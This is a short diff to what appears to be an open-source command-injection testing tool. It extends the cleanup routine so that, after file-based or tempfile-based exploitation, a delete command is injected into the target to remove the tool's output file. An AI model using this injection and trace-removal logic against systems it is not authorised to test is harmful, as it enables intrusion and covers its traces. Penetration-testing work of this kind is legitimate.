@@ -64,14 +64,21 @@ def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_met
 Delete previous shells outputs.
 """
 def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
-  if settings.FILE_BASED_STATE != None:
+  if settings.FILE_BASED_STATE != None or settings.TEMPFILE_BASED_STATE != None:
     if settings.VERBOSITY_LEVEL != 0:
       debug_msg = "Cleaning up the target operating system (i.e. deleting file '" + OUTPUT_TEXTFILE + "')."
       print(settings.print_debug_msg(debug_msg))
+  if settings.FILE_BASED_STATE != None:
     if settings.TARGET_OS == settings.OS.WINDOWS:
       cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE
     else:
       cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+  elif settings.TEMPFILE_BASED_STATE != None:
+    if settings.TARGET_OS == settings.OS.WINDOWS:
+      cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
+    else:
+      cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
 """
